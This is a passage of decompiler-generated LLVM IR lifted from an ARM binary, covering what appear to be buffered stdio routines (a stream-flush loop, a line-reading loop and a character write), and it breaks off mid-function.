  %v1_eb28 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_18128.287 to i32), i32* %r0.global-to-local, align 4
  %v1_eb38 = call i32 @function_10d4c()
  %v2_eb40 = load i32, i32* @global_var_188a4.289, align 4
  %v1_eb44 = add i32 %v2_eb40, 1
  store i32 %v1_eb44, i32* %r3.global-to-local, align 4
  store i32 %v1_eb44, i32* @global_var_188a4.289, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  %v1_eb5c = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  %v1_eb70 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_18110.326 to i32), i32* %r0.global-to-local, align 4
  %v1_eb7c = call i32 @function_10d4c()
  store i32 ptrtoint (i32** @global_var_1810c.329 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_eb8c = load i32, i32* bitcast (i32** @global_var_1810c.329 to i32*), align 4
  store i32 %v2_eb8c, i32* @r6, align 4
  %v1_eb94 = call i32 @function_10d54()
  store i32 %v1_eb94, i32* %r0.global-to-local, align 4
  store i32 %v2_eafc, i32* @r4, align 4
  %v0_eb9c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_eb9c, i32* @r5, align 4
  %v0_ec50.pr = load i32, i32* @r6, align 4
  %v2_ec5025 = icmp eq i32 %v0_ec50.pr, 0
  store i1 %v2_ec5025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec5025, label %dec_label_pc_ec58, label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_eb14, %.thread11
  %v0_ebc0 = phi i32 [ %v3_ec4c, %.thread11 ], [ %v0_ec50.pr, %dec_label_pc_eb14 ]
  %v1_eba4 = inttoptr i32 %v0_ebc0 to i8*
  %v2_eba4 = load i8, i8* %v1_eba4, align 1
  %v3_eba4 = zext i8 %v2_eba4 to i32
  store i32 %v3_eba4, i32* %r3.global-to-local, align 4
  %v1_eba8 = and i32 %v3_eba4, 64
  %v2_eba8 = icmp eq i32 %v1_eba8, 0
  store i1 %v2_eba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eba8, label %.thread11, label %dec_label_pc_ebb0

dec_label_pc_ebb0:                                ; preds = %dec_label_pc_eba4
  %v2_ebb4 = load i32, i32* @global_var_18140.320, align 4
  store i32 %v2_ebb4, i32* %r3.global-to-local, align 4
  %v7_ebb8 = icmp eq i32 %v2_ebb4, 2
  store i1 %v7_ebb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebb8, label %dec_label_pc_ebec, label %dec_label_pc_ebc0

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ebb0
  %v1_ebc0 = add i32 %v0_ebc0, 56
  store i32 %v1_ebc0, i32* @r4, align 4
  store i32 %v2_eafc, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  %v1_ebd8 = call i32 @function_10d54()
  %v0_ebdc = load i32, i32* @r4, align 4
  store i32 %v0_ebdc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_ebe8 = call i32 @function_10d4c()
  store i32 %v1_ebe8, i32* %r0.global-to-local, align 4
  %v0_ebec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebb0, %dec_label_pc_ebc0
  %v0_ec00 = phi i32 [ %v0_ebc0, %dec_label_pc_ebb0 ], [ %v0_ebec.pre, %dec_label_pc_ebc0 ]
  %v1_ebec = inttoptr i32 %v0_ec00 to i32*
  %v2_ebec = load i32, i32* %v1_ebec, align 4
  %v0_ebf0 = load i32, i32* %sl.global-to-local, align 4
  %v2_ebf0 = or i32 %v0_ebf0, %v2_ebec
  %v1_ebf4 = xor i32 %v2_ebf0, 320
  store i32 %v1_ebf4, i32* %r3.global-to-local, align 4
  %v1_ebf8 = and i32 %v1_ebf4, 832
  %v2_ebf8 = icmp eq i32 %v1_ebf8, 0
  store i1 %v2_ebf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebf8, label %dec_label_pc_ec00, label %bb39

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebec
  store i32 %v0_ec00, i32* @r0, align 4
  %v0_ec04 = call i32 @function_d8c8()
  store i32 %v0_ec04, i32* %r0.global-to-local, align 4
  %v2_ec08 = icmp eq i32 %v0_ec04, 0
  store i1 %v2_ec08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec08, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_ec00
  %v1_ec0c = load i32, i32* @r6, align 4
  %v2_ec0c = inttoptr i32 %v1_ec0c to i32*
  %v3_ec0c = load i32, i32* %v2_ec0c, align 4
  store i32 %v3_ec0c, i32* %r3.global-to-local, align 4
  %v2_ec10 = add i32 %v1_ec0c, 8
  %v3_ec10 = inttoptr i32 %v2_ec10 to i32*
  %v4_ec10 = load i32, i32* %v3_ec10, align 4
  %v2_ec14 = and i32 %v3_ec0c, -65
  store i32 %v2_ec14, i32* %r3.global-to-local, align 4
  %v4_ec18 = sdiv i32 %v3_ec0c, 256
  store i32 %v4_ec18, i32* %r1.global-to-local, align 4
  %v3_ec1c = add i32 %v1_ec0c, 28
  %v4_ec1c = inttoptr i32 %v3_ec1c to i32*
  store i32 %v4_ec10, i32* %v4_ec1c, align 4
  %v1_ec20 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec20 = trunc i32 %v1_ec20 to i8
  %v3_ec20 = load i32, i32* @r6, align 4
  %v4_ec20 = add i32 %v3_ec20, 1
  %v5_ec20 = inttoptr i32 %v4_ec20 to i8*
  store i8 %v2_ec20, i8* %v5_ec20, align 1
  %v0_ec24.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec24.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_ec24 = load i32, i32* %r3.global-to-local, align 4
  %v2_ec24 = trunc i32 %v1_ec24 to i8
  %v3_ec24 = load i32, i32* @r6, align 4
  %v4_ec24 = inttoptr i32 %v3_ec24 to i8*
  store i8 %v2_ec24, i8* %v4_ec24, align 1
  %v0_ec28.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec28.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ec00, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_ebec, %.thread6, %.thread7
  %v2_ec30 = load i32, i32* @global_var_18140.320, align 4
  store i32 %v2_ec30, i32* %r3.global-to-local, align 4
  %v7_ec34 = icmp eq i32 %v2_ec30, 2
  store i1 %v7_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec34, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_eafc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 68948)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_eba4, %bb40
  %v0_ec4c = load i32, i32* @r6, align 4
  %v1_ec4c = add i32 %v0_ec4c, 32
  %v2_ec4c = inttoptr i32 %v1_ec4c to i32*
  %v3_ec4c = load i32, i32* %v2_ec4c, align 4
  store i32 %v3_ec4c, i32* @r6, align 4
  %v2_ec50 = icmp eq i32 %v3_ec4c, 0
  store i1 %v2_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec50, label %dec_label_pc_ec50.dec_label_pc_ec58_crit_edge, label %dec_label_pc_eba4

dec_label_pc_ec50.dec_label_pc_ec58_crit_edge:    ; preds = %.thread11
  %v0_ec58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec50.dec_label_pc_ec58_crit_edge, %dec_label_pc_eb14
  %v0_ec58 = phi i32 [ %v0_ec58.pre, %dec_label_pc_ec50.dec_label_pc_ec58_crit_edge ], [ %v1_eb94, %dec_label_pc_eb14 ]
  %v1_ec58 = call i32 @function_e9a8(i32 %v0_ec58)
  store i32 %v1_ec58, i32* %r0.global-to-local, align 4
  %v0_ec9c.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_ec60:                                ; preds = %dec_label_pc_eb08
  %v1_ec60 = inttoptr i32 %.v1_eaf4 to i8*
  %v2_ec60 = load i8, i8* %v1_ec60, align 1
  %v3_ec60 = zext i8 %v2_ec60 to i32
  %v1_ec64 = and i32 %v3_ec60, 64
  store i32 %v1_ec64, i32* %r3.global-to-local, align 4
  %v2_ec64 = icmp eq i32 %v1_ec64, 0
  store i1 %v2_ec64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec64, label %bb41, label %dec_label_pc_ec70

bb41:                                             ; preds = %dec_label_pc_ec60
  br label %bb43

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ec60
  %v0_ec70 = call i32 @function_d8c8()
  store i32 %v0_ec70, i32* %r0.global-to-local, align 4
  %v2_ec74 = icmp eq i32 %v0_ec70, 0
  store i1 %v2_ec74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec74, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_ec70
  %v1_ec78 = load i32, i32* %r8.global-to-local, align 4
  %v2_ec78 = inttoptr i32 %v1_ec78 to i32*
  %v3_ec78 = load i32, i32* %v2_ec78, align 4
  store i32 %v3_ec78, i32* %r3.global-to-local, align 4
  %v2_ec7c = add i32 %v1_ec78, 8
  %v3_ec7c = inttoptr i32 %v2_ec7c to i32*
  %v4_ec7c = load i32, i32* %v3_ec7c, align 4
  store i32 %v4_ec7c, i32* %r1.global-to-local, align 4
  %v2_ec80 = and i32 %v3_ec78, -65
  store i32 %v2_ec80, i32* %r3.global-to-local, align 4
  %v4_ec84 = sdiv i32 %v3_ec78, 256
  %v2_ec88 = trunc i32 %v4_ec84 to i8
  %v4_ec88 = add i32 %v1_ec78, 1
  %v5_ec88 = inttoptr i32 %v4_ec88 to i8*
  store i8 %v2_ec88, i8* %v5_ec88, align 1
  %v0_ec8c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec8c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_ec8c = load i32, i32* %r1.global-to-local, align 4
  %v2_ec8c = load i32, i32* %r8.global-to-local, align 4
  %v3_ec8c = add i32 %v2_ec8c, 28
  %v4_ec8c = inttoptr i32 %v3_ec8c to i32*
  store i32 %v1_ec8c, i32* %v4_ec8c, align 4
  %v1_ec90 = load i32, i32* %r3.global-to-local, align 4
  %v2_ec90 = trunc i32 %v1_ec90 to i8
  %v3_ec90 = load i32, i32* %r8.global-to-local, align 4
  %v4_ec90 = inttoptr i32 %v3_ec90 to i8*
  store i8 %v2_ec90, i8* %v4_ec90, align 1
  %v0_ec94.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec94.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_ec70
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_ec58, %.thread20
  %v0_ec9c = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_ec9c.pre, %dec_label_pc_ec58 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_ec9c, i32* %r0.global-to-local, align 4
  store i32 %v3_eae8, i32* @r4, align 4
  ret i32 %v0_ec9c

; uselistorder directives
  uselistorder i32 %v0_ec9c, { 1, 0 }
  uselistorder i32 %v3_ec4c, { 1, 2, 0 }
  uselistorder i32 %v2_eafc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 2, 1, 8, 0, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32 (i32)* @function_e9a8, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1810c.329 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_188a4.289, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ebec, { 1, 0 }
  uselistorder label %dec_label_pc_eba4, { 1, 0 }
  uselistorder label %dec_label_pc_eb14, { 1, 0 }
}

define i32 @function_eccc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_eccc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecd0 = icmp eq i32 %arg2, 0
  store i1 %v2_ecd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_ed58, label %dec_label_pc_ed3c.preheader

dec_label_pc_ed3c.preheader:                      ; preds = %dec_label_pc_eccc
  store i32 %tmp, i32* @r4, align 4
  %v1_ed3c15 = add i32 %arg2, -1
  store i32 %v1_ed3c15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_ed3c21 = icmp eq i32 %arg2, 1
  store i1 %v7_ed3c21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed3c21, label %dec_label_pc_ed48, label %dec_label_pc_ece8

dec_label_pc_ece8:                                ; preds = %dec_label_pc_ed3c.preheader, %dec_label_pc_ed3c.backedge
  %v1_ed4024.in = phi i32 [ %v0_ed40.pre, %dec_label_pc_ed3c.backedge ], [ %arg3, %dec_label_pc_ed3c.preheader ]
  %v1_ece8 = add i32 %v1_ed4024.in, 16
  %v2_ece8 = inttoptr i32 %v1_ece8 to i32*
  %v3_ece8 = load i32, i32* %v2_ece8, align 4
  store i32 %v3_ece8, i32* %r2.global-to-local, align 4
  %v1_ecec = add i32 %v1_ed4024.in, 24
  %v2_ecec = inttoptr i32 %v1_ecec to i32*
  %v3_ecec = load i32, i32* %v2_ecec, align 4
  %v3_ecf0 = icmp uge i32 %v3_ece8, %v3_ecec
  store i1 %v3_ecf0, i1* %cpsr_c.global-to-local, align 1
  %v9_ecf0 = icmp eq i32 %v3_ece8, %v3_ecec
  store i1 %v9_ecf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ecf0, label %dec_label_pc_ed10, label %dec_label_pc_ecf8

dec_label_pc_ecf8:                                ; preds = %dec_label_pc_ece8
  %v1_ecf8 = inttoptr i32 %v3_ece8 to i8*
  %v2_ecf8 = load i8, i8* %v1_ecf8, align 1
  %v5_ecf8 = add i32 %v3_ece8, 1
  store i32 %v5_ecf8, i32* %r2.global-to-local, align 4
  %v2_ecfc = load i32, i32* @r4, align 4
  %v3_ecfc = inttoptr i32 %v2_ecfc to i8*
  store i8 %v2_ecf8, i8* %v3_ecfc, align 1
  %v0_ed00 = load i32, i32* @r4, align 4
  %v1_ed00 = inttoptr i32 %v0_ed00 to i8*
  %v2_ed00 = load i8, i8* %v1_ed00, align 1
  %v5_ed00 = add i32 %v0_ed00, 1
  store i32 %v5_ed00, i32* @r4, align 4
  %v2_ed04 = icmp ugt i8 %v2_ed00, 9
  store i1 %v2_ed04, i1* %cpsr_c.global-to-local, align 1
  %v7_ed04 = icmp eq i8 %v2_ed00, 10
  store i1 %v7_ed04, i1* %cpsr_z.global-to-local, align 1
  %v0_ed08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ed08 = load i32, i32* @r5, align 4
  %v2_ed08 = add i32 %v1_ed08, 16
  %v3_ed08 = inttoptr i32 %v2_ed08 to i32*
  store i32 %v0_ed08, i32* %v3_ed08, align 4
  br i1 %v7_ed04, label %dec_label_pc_ed48, label %dec_label_pc_ed3c.backedge

dec_label_pc_ed10:                                ; preds = %dec_label_pc_ece8
  %v1_ed4024 = inttoptr i32 %v1_ed4024.in to i8*
  %v3_ed10 = call i32 @function_121d8(i8* %v1_ed4024)
  %v4_ed10 = trunc i32 %v3_ed10 to i8
  %v5_ed14 = icmp eq i8 %v4_ed10, -1
  store i1 %v5_ed14, i1* %cpsr_c.global-to-local, align 1
  %v10_ed14 = icmp eq i32 %v3_ed10, -1
  store i1 %v10_ed14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_ed14, label %dec_label_pc_ed1c, label %dec_label_pc_ed38

dec_label_pc_ed1c:                                ; preds = %dec_label_pc_ed10
  %v0_ed1c = load i32, i32* @r5, align 4
  %v1_ed1c = inttoptr i32 %v0_ed1c to i8*
  %v2_ed1c = load i8, i8* %v1_ed1c, align 1
  %v1_ed20 = and i8 %v2_ed1c, 8
  %v2_ed20 = icmp eq i8 %v1_ed20, 0
  store i1 %v2_ed20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed20, label %dec_label_pc_ed48, label %dec_label_pc_ed58

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed10
  %v3_ed2c = load i32, i32* @r4, align 4
  %v4_ed2c = inttoptr i32 %v3_ed2c to i8*
  store i8 %v4_ed10, i8* %v4_ed2c, align 1
  %v0_ed30 = load i32, i32* @r4, align 4
  %v1_ed30 = inttoptr i32 %v0_ed30 to i8*
  %v2_ed30 = load i8, i8* %v1_ed30, align 1
  %v5_ed30 = add i32 %v0_ed30, 1
  store i32 %v5_ed30, i32* @r4, align 4
  %v2_ed34 = icmp ugt i8 %v2_ed30, 9
  store i1 %v2_ed34, i1* %cpsr_c.global-to-local, align 1
  %v7_ed34 = icmp eq i8 %v2_ed30, 10
  store i1 %v7_ed34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed34, label %dec_label_pc_ed48, label %dec_label_pc_ed3c.backedge

dec_label_pc_ed3c.backedge:                       ; preds = %dec_label_pc_ed38, %dec_label_pc_ecf8
  %v0_ed3c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_ed40.pre = load i32, i32* @r5, align 4
  %v1_ed3c = add i32 %v0_ed3c.pre, -1
  store i32 %v1_ed3c, i32* %r6.global-to-local, align 4
  %v2_ed3c = icmp ne i32 %v0_ed3c.pre, 0
  store i1 %v2_ed3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed3c = icmp eq i32 %v0_ed3c.pre, 1
  store i1 %v7_ed3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed3c, label %dec_label_pc_ed48, label %dec_label_pc_ece8

dec_label_pc_ed48:                                ; preds = %dec_label_pc_ed3c.preheader, %dec_label_pc_ed38, %dec_label_pc_ed3c.backedge, %dec_label_pc_ecf8, %dec_label_pc_ed1c
  %v0_ed48 = load i32, i32* @r4, align 4
  %v1_ed48 = load i32, i32* %r7.global-to-local, align 4
  %v3_ed48 = icmp uge i32 %v0_ed48, %v1_ed48
  store i1 %v3_ed48, i1* %cpsr_c.global-to-local, align 1
  %v9_ed48 = icmp eq i32 %v0_ed48, %v1_ed48
  store i1 %v9_ed48, i1* %cpsr_z.global-to-local, align 1
  %v2_ed4c = xor i1 %v9_ed48, true
  %v3_ed4c = and i1 %v3_ed48, %v2_ed4c
  br i1 %v3_ed4c, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_ed48
  %v7_ed50 = inttoptr i32 %v0_ed48 to i8*
  store i8 0, i8* %v7_ed50, align 1
  %v0_ed54.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_ed54.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ed48, %bb
  %v1_ed54 = phi i1 [ %v1_ed54.pre, %bb ], [ %v9_ed48, %dec_label_pc_ed48 ]
  %v0_ed54 = phi i1 [ %v0_ed54.pre, %bb ], [ %v3_ed48, %dec_label_pc_ed48 ]
  %v2_ed54 = xor i1 %v1_ed54, true
  %v3_ed54 = and i1 %v0_ed54, %v2_ed54
  br i1 %v3_ed54, label %.dec_label_pc_ed5c_crit_edge, label %dec_label_pc_ed58

.dec_label_pc_ed5c_crit_edge:                     ; preds = %.thread7
  %v0_ed5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_ed58:                                ; preds = %dec_label_pc_eccc, %dec_label_pc_ed1c, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_ed5c:                                ; preds = %.dec_label_pc_ed5c_crit_edge, %dec_label_pc_ed58
  %v0_ed5c = phi i32 [ %v0_ed5c.pre, %.dec_label_pc_ed5c_crit_edge ], [ 0, %dec_label_pc_ed58 ]
  ret i32 %v0_ed5c

; uselistorder directives
  uselistorder i1 %v9_ed48, { 1, 0, 2 }
  uselistorder i32 %v1_ed48, { 1, 0 }
  uselistorder i32 %v0_ed48, { 0, 2, 1 }
  uselistorder i32 %v0_ed3c.pre, { 2, 0, 1 }
  uselistorder i1 %v2_ed20, { 1, 0 }
  uselistorder i32 %v3_ece8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_ed4024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder label %dec_label_pc_ed5c, { 1, 0 }
  uselistorder label %dec_label_pc_ed58, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_ed48, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_ece8, { 1, 0 }
}

define i32 @function_ed64(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ed64:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-13 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_ed64 = load i32, i32* @r4, align 4
  store i32 %v3_ed64, i32* %stack_var_-12, align 4
  %v6_ed64 = load i32, i32* @r5, align 4
  %v2_ed68 = add i32 %arg2, 16
  %v3_ed68 = inttoptr i32 %v2_ed68 to i32*
  %v4_ed68 = load i32, i32* %v3_ed68, align 4
  store i32 %v4_ed68, i32* %r2.global-to-local, align 4
  %v2_ed6c = add i32 %arg2, 28
  %v3_ed6c = inttoptr i32 %v2_ed6c to i32*
  %v4_ed6c = load i32, i32* %v3_ed6c, align 4
  store i32 %v4_ed6c, i32* %r3.global-to-local, align 4
  %v3_ed70 = icmp uge i32 %v4_ed68, %v4_ed6c
  store i1 %v3_ed70, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_ed7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ed7c, i32* @r5, align 4
  br i1 %v3_ed70, label %dec_label_pc_ed94, label %.thread

.thread:                                          ; preds = %dec_label_pc_ed64
  %v2_ed80 = urem i32 %v0_ed7c, 256
  store i32 %v2_ed80, i32* %r3.global-to-local, align 4
  %v2_ed84 = trunc i32 %v0_ed7c to i8
  %v4_ed84 = inttoptr i32 %v4_ed68 to i8*
  store i8 %v2_ed84, i8* %v4_ed84, align 1
  %v5_ed84 = load i32, i32* %r2.global-to-local, align 4
  %v6_ed84 = add i32 %v5_ed84, 1
  store i32 %v6_ed84, i32* %r2.global-to-local, align 4
  %v0_ed88.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ed88.pr.pr, label %dec_label_pc_ed94, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_ed88 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_ed88, i32* %r0.global-to-local, align 4
  store i32 %v6_ed84, i32* %v3_ed68, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ed64, %.thread
  %v3_ed94 = load i8, i8* %tmp, align 1
  %v4_ed94 = zext i8 %v3_ed94 to i32
  %v1_ed98 = and i32 %v4_ed94, 192
  store i32 %v1_ed98, i32* %r3.global-to-local, align 4
  %v2_ed9c = icmp eq i32 %v1_ed98, 192
  store i1 %v2_ed9c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_ed9c, label %dec_label_pc_edb8, label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ed94
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_edac = call i32 @function_11878(i8* nonnull %tmp, i32 128)
  store i32 %v4_edac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edb0 = icmp eq i32 %v4_edac, 0
  br i1 %v2_edb0, label %dec_label_pc_edb8, label %dec_label_pc_ee5c

dec_label_pc_edb8:                                ; preds = %dec_label_pc_eda4, %dec_label_pc_ed94
  %v0_edb8 = load i32, i32* @r4, align 4
  %v1_edb8 = add i32 %v0_edb8, 4
  %v2_edb8 = inttoptr i32 %v1_edb8 to i32*
  %v3_edb8 = load i32, i32* %v2_edb8, align 4
  store i32 %v3_edb8, i32* %r3.global-to-local, align 4
  %v2_edbc = icmp ugt i32 %v3_edb8, -3
  store i1 %v2_edbc, i1* %cpsr_c.global-to-local, align 1
  %v7_edbc = icmp eq i32 %v3_edb8, -2
  br i1 %v7_edbc, label %dec_label_pc_ee54, label %dec_label_pc_edc4

dec_label_pc_edc4:                                ; preds = %dec_label_pc_edb8
  %v1_edc4 = add i32 %v0_edb8, 12
  %v2_edc4 = inttoptr i32 %v1_edc4 to i32*
  %v3_edc4 = load i32, i32* %v2_edc4, align 4
  store i32 %v3_edc4, i32* %r2.global-to-local, align 4
  %v1_edc8 = add i32 %v0_edb8, 8
  %v2_edc8 = inttoptr i32 %v1_edc8 to i32*
  %v3_edc8 = load i32, i32* %v2_edc8, align 4
  store i32 %v3_edc8, i32* %r3.global-to-local, align 4
  %v3_edcc = icmp uge i32 %v3_edc4, %v3_edc8
  store i1 %v3_edcc, i1* %cpsr_c.global-to-local, align 1
  %v9_edcc = icmp eq i32 %v3_edc4, %v3_edc8
  br i1 %v9_edcc, label %dec_label_pc_ee38, label %dec_label_pc_edd4

dec_label_pc_edd4:                                ; preds = %dec_label_pc_edc4
  %v1_edd4 = add i32 %v0_edb8, 16
  %v2_edd4 = inttoptr i32 %v1_edd4 to i32*
  %v3_edd4 = load i32, i32* %v2_edd4, align 4
  store i32 %v3_edd4, i32* %r3.global-to-local, align 4
  %v3_edd8 = icmp uge i32 %v3_edc4, %v3_edd4
  store i1 %v3_edd8, i1* %cpsr_c.global-to-local, align 1
  %v9_edd8 = icmp eq i32 %v3_edc4, %v3_edd4
  br i1 %v9_edd8, label %dec_label_pc_ede0, label %dec_label_pc_edf0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_edd4
  store i32 %v0_edb8, i32* @r0, align 4
  %v0_ede4 = call i32 @function_d8c8()
  store i32 %v0_ede4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ede8 = icmp eq i32 %v0_ede4, 0
  br i1 %v2_ede8, label %dec_label_pc_ede0.dec_label_pc_edf0_crit_edge, label %dec_label_pc_ee5c

dec_label_pc_ede0.dec_label_pc_edf0_crit_edge:    ; preds = %dec_label_pc_ede0
  %v0_edf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_edf0

dec_label_pc_edf0:                                ; preds = %dec_label_pc_ede0.dec_label_pc_edf0_crit_edge, %dec_label_pc_edd4
  %v0_edf0 = phi i32 [ %v0_edf0.pre, %dec_label_pc_ede0.dec_label_pc_edf0_crit_edge ], [ %v0_edb8, %dec_label_pc_edd4 ]
  %v1_edf0 = add i32 %v0_edf0, 16
  %v2_edf0 = inttoptr i32 %v1_edf0 to i32*
  %v3_edf0 = load i32, i32* %v2_edf0, align 4
  store i32 %v3_edf0, i32* %r2.global-to-local, align 4
